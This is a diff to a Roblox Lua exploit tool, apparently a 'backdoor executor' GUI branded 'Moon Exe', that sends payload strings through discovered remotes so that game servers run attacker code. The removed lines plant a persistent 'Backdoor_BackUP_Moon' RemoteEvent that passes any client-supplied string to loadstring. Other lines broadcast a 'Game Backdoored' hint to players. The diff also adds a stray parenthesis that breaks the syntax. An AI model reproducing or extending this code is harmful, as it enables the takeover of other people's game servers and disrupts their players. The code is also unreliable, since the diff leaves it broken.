@@ -11,7 +11,7 @@
 local G2L = {};
 
 -- StarterGui.ScreenGui
-G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
+G2L["1"] = Instance.new("ScreenGui", game.CoreGui));
 G2L["1"]["IgnoreGuiInset"] = true;
 G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
@@ -572,17 +572,6 @@ local script = G2L["d"];
 		
 		
 	
-		local SS = [[
-		if game.ReplicatedStorage:FindFirstChild("Backdoor_BackUP_Moon") then
-			return false
-		else
-			local ok = Instance.new("RemoteEvent", game.ReplicatedStorage)
-			ok.Name = "Backdoor_BackUP_Moon"
-			ok.OnServerEvent:Connect(function(plr, ss)
-				loadstring(ss)()
-			end)
-		end
-		]]
 		
 		local Hint = [[
 		local hint = Instance.new("Hint", game.Workspace)
@@ -596,24 +585,20 @@ local script = G2L["d"];
 			hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
 		end
 		]]
-		if remote then
-			pcall(function() remote:InvokeServer(SS) end)
-			pcall(function() remote:FireServer(SS) end)
-		end
 		
 		pcall(function()
 			if isFunction then
 				task.spawn(function()
-					pcall(function() remote:InvokeServer(RE) end)
-					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
 					pcall(function() remote:InvokeServer(payload) end)
 					pcall(function() remote:InvokeServer("moonTSS", payload) end)
+					pcall(function() remote:InvokeServer(RE) end)
+					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
 				end)
 			else
-				pcall(function() remote:FireServer(RE) end)
-				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
 				pcall(function() remote:FireServer(payload) end)
 				pcall(function() remote:FireServer("moonTSS", payload) end)
+				pcall(function() remote:FireServer(RE) end)
+				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
 			end
 		end)
 	
